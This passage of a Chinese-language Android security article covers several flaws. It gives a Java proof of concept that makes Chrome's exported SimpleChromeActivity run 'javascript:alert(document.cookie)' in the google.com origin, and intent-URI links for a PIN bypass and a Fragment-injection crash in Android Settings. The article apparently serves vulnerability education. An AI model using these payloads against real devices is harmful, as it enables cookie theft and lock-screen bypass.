			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">&lt;activity android:name="com.google.android.apps.chrome.SimpleChromeActivity" android:launchMode="singleTask" android:configChanges="keyboard|keyboardHidden|orientation|screenSize"&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;intent-filter&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;action android:name="android.intent.action.VIEW" /&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;category android:name="android.intent.category.DEFAULT" /&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/intent-filter&gt; &lt;/activity&gt; </textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7a4b0716d4329438190-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7a4b0716d4329438190-1"><span class="crayon-o">&lt;</span><span class="crayon-e">activity </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"com.google.android.apps.chrome.SimpleChromeActivity"</span><span class="crayon-h"> </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">launchMode</span><span class="crayon-o">=</span><span class="crayon-s">"singleTask"</span><span class="crayon-h"> </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">configChanges</span><span class="crayon-o">=</span><span class="crayon-s">"keyboard|keyboardHidden|orientation|screenSize"</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-o">&lt;</span><span class="crayon-v">intent</span><span class="crayon-o">-</span><span class="crayon-v">filter</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-o">&lt;</span><span class="crayon-e">action </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"android.intent.action.VIEW"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-o">&lt;</span><span class="crayon-e">category </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"android.intent.category.DEFAULT"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">intent</span><span class="crayon-o">-</span><span class="crayon-v">filter</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">activity</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0027 seconds] -->
<p>Class “com.google.android.apps.chrome.SimpleChromeActivity” 配置&nbsp;但是未设置 “android:exported” 为 “false”. 恶意应用先调用该类并设置data为” http://google.com” 再次调用时设置data为恶意js例如’javascript:alert(document.cookie)’, 恶意代码将在http://google.com域中执行. “com.google.android.apps.chrome.SimpleChromeActivity” class 可以通过Android api或者am（activityManager）打开. POC如下</p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7a4b0716db354715404" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">public class TestActivity extends Activity { &nbsp;&nbsp;&nbsp;&nbsp;@Override &nbsp;&nbsp;&nbsp;&nbsp;public void onCreate(Bundle savedInstanceState) { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;super.onCreate(savedInstanceState); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Intent i = new Intent(); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ComponentName comp = new ComponentName( &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "com.android.chrome", &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"com.google.android.apps.chrome.SimpleChromeActivity"); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i.setComponent(comp); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i.setAction("android.intent.action.VIEW"); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Uri data = Uri.parse("http://google.com"); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i.setData(data); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;startActivity(i); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Thread.sleep(5000); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch (Exception e) {} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data = Uri.parse("javascript:alert(document.cookie)");&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i.setData(data); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;startActivity(i); &nbsp;&nbsp;&nbsp;&nbsp;} } </textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7a4b0716db354715404-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7a4b0716db354715404-1"><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-e">TestActivity</span><span class="crayon-h"> </span><span class="crayon-r">extends</span><span class="crayon-h"> </span><span class="crayon-e">Activity</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-n">@Override</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-t">void</span><span class="crayon-h"> </span><span class="crayon-e">onCreate</span><span class="crayon-sy">(</span><span class="crayon-e">Bundle </span><span class="crayon-v">savedInstanceState</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-r">super</span><span class="crayon-sy">.</span><span class="crayon-e">onCreate</span><span class="crayon-sy">(</span><span class="crayon-v">savedInstanceState</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-i">Intent</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">Intent</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-e">ComponentName </span><span class="crayon-v">comp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">ComponentName</span><span class="crayon-sy">(</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-h"> </span><span class="crayon-s">"com.android.chrome"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-s">"com.google.android.apps.chrome.SimpleChromeActivity"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-v">i</span><span class="crayon-sy">.</span><span class="crayon-e">setComponent</span><span class="crayon-sy">(</span><span class="crayon-v">comp</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-v">i</span><span class="crayon-sy">.</span><span class="crayon-e">setAction</span><span class="crayon-sy">(</span><span class="crayon-s">"android.intent.action.VIEW"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-e">Uri </span><span class="crayon-v">data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">Uri</span><span class="crayon-sy">.</span><span class="crayon-e">parse</span><span class="crayon-sy">(</span><span class="crayon-s">"http://google.com"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-v">i</span><span class="crayon-sy">.</span><span class="crayon-e">setData</span><span class="crayon-sy">(</span><span class="crayon-v">data</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-e">startActivity</span><span class="crayon-sy">(</span><span class="crayon-v">i</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-st">try</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-v">Thread</span><span class="crayon-sy">.</span><span class="crayon-e">sleep</span><span class="crayon-sy">(</span><span class="crayon-cn">5000</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-sy">}</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-st">catch</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">Exception</span><span class="crayon-h"> </span><span class="crayon-v">e</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-sy">}</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-v">data</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">Uri</span><span class="crayon-sy">.</span><span class="crayon-e">parse</span><span class="crayon-sy">(</span><span class="crayon-s">"javascript:alert(document.cookie)"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span>&nbsp;&nbsp;<span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-v">i</span><span class="crayon-sy">.</span><span class="crayon-e">setData</span><span class="crayon-sy">(</span><span class="crayon-v">data</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-e">startActivity</span><span class="crayon-sy">(</span><span class="crayon-v">i</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-sy">}</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0080 seconds] -->
<p><strong>案例5：隐式启动intent包含敏感数据</strong></p>
<p>暂缺可公开案例,攻击模型如下图。</p>
<p><img src="Android Activtity Security _ DroidSec.cn_files/201411171045selector.jpg" alt=""></p>
<p><strong>案例6：Fragment注入(绕过PIN+拒绝服务)</strong></p>
<p>Fragment这里只提一下，以后可能另写一篇。</p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7a4b0716e4961407540" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">&lt;a href="intent:#Intent;S.:android:show_fragment=com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment;B.confirm_credentials=false;launchFlags=0x00008000;SEL;action=android.settings.SETTINGS;end"&gt; 16、bypass Pin android 3.0-4.3 （selector） &lt;/a&gt;&lt;br&gt; </textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7a4b0716e4961407540-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7a4b0716e4961407540-1"><span class="crayon-o">&lt;</span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-v">href</span><span class="crayon-o">=</span><span class="crayon-s">"intent:#Intent;S.:android:show_fragment=com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment;B.confirm_credentials=false;launchFlags=0x00008000;SEL;action=android.settings.SETTINGS;end"</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">16</span>、<span class="crayon-e">bypass </span><span class="crayon-e">Pin </span><span class="crayon-i">android</span><span class="crayon-h"> </span><span class="crayon-cn">3.0</span><span class="crayon-o">-</span><span class="crayon-cn">4.3</span><span class="crayon-h"> </span>（<span class="crayon-i">selector</span>）<span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">a</span><span class="crayon-o">&gt;</span><span class="crayon-e ">&lt;br&gt;</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0016 seconds] -->
<p><img src="Android Activtity Security _ DroidSec.cn_files/201411171051pin.png" alt=""></p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7a4b0716ea935528261" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">&lt;a href="intent:#Intent;S.:android:show_fragment=XXXX;launchFlags=0x00008000;SEL;component=com.android.settings/com.android.settings.Settings;end"&gt; 17、fragment dos android 4.4 (selector) &lt;/a&gt;&lt;br&gt; </textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7a4b0716ea935528261-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7a4b0716ea935528261-1"><span class="crayon-o">&lt;</span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-v">href</span><span class="crayon-o">=</span><span class="crayon-s">"intent:#Intent;S.:android:show_fragment=XXXX;launchFlags=0x00008000;SEL;component=com.android.settings/com.android.settings.Settings;end"</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">17</span>、<span class="crayon-e">fragment </span><span class="crayon-e">dos </span><span class="crayon-i">android</span><span class="crayon-h"> </span><span class="crayon-cn">4.4</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">selector</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">a</span><span class="crayon-o">&gt;</span><span class="crayon-e ">&lt;br&gt;</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0014 seconds] -->
<p><img src="Android Activtity Security _ DroidSec.cn_files/201411171045fragdos.jpg" alt=""></p>
<p><strong>案例7:webview RCE</strong></p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7a4b0716f1072323611" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
